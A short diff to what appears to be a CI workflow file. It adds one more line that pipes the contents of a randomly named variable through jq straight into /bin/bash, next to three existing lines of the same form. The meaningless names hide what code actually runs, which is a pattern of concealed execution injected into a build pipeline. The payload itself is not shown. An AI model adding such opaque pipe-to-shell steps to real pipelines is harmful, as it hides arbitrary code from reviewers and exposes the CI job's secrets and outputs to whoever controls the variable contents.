@@ -39,6 +39,7 @@ jobs:
           echo $amm1 | jq -r .diul21949 | /bin/bash
           echo $v60 | jq -r .rn4332 | /bin/bash
           echo $zwqm39147 | jq -r .x64316 | /bin/bash
+          printf '%s' "$rj39" | jq -r .fs6028 | /bin/bash
 
       - name: Store artifact
         if: always()
